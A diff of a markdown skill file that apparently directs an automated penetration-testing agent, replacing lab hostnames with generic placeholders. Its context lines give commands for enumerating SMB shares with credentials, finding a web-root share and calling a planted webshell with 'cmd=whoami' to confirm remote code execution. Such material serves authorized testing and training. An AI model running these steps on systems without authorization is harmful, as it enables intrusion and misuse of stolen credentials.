@@ -67,7 +67,7 @@ The orchestrator will provide specific guidance or route to a different skill.
 
 ## State Management
 
-Call `get_state_summary()` from the state-reader MCP server to read current
+Call `get_state_summary()` from the state MCP server to read current
 engagement state. Use it to:
 - Skip re-testing targets, parameters, or vulns already confirmed
 - Leverage existing credentials or access for this technique
@@ -148,7 +148,7 @@ nxc smb TARGET -u 'user' -p 'password' -d DOMAIN --shares
 smbclient "//TARGET/Web" -U 'DOMAIN\user' --password='PASSWORD' -c 'ls'
 
 # Look for: index.php, index.html, web.config, .htaccess, default.aspx
-# Subdirectories matching vhosts (e.g., school.flight.htb/)
+# Subdirectories matching vhosts (e.g., app.example.com/)
 ```
 
 ### Identify web technology
@@ -240,7 +240,7 @@ curl -s "http://TARGET/shell.jsp?cmd=whoami"
 ```
 
 If the webshell responds with the service account name (e.g., `nt authority\local service`,
-`flight\svc_apache`, `www-data`), you have RCE. Proceed to Step 4.
+`domain\svc_web`, `www-data`), you have RCE. Proceed to Step 4.
 
 **If the webshell returns empty or 404:**
 - Verify the share path maps to the web root (check subdirectories)
